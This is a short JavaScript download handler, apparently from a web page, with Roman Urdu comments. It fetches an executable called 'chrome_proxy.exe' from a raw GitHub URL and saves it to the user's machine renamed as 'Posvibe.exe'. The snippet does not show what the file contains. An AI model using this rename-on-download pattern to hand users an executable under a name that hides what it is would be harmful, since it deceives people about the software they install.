function handleDownload() {
  const appUrl = 'https://github.com/almeeradil/Posvibe/raw/refs/heads/main/chrome_proxy.exe';
  
  fetch(appUrl)
    .then(response => response.blob())
    .then(blob => {
      const url = URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = url;
      link.download = 'Posvibe.exe'; // Yeh naam ab lazmi override ho jayega
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      URL.revokeObjectURL(url);
    })
    .catch(err => {
      // Agar CORS policy ya network ka masla ho toh direct link khol dega
      window.location.href = appUrl;
    });
}
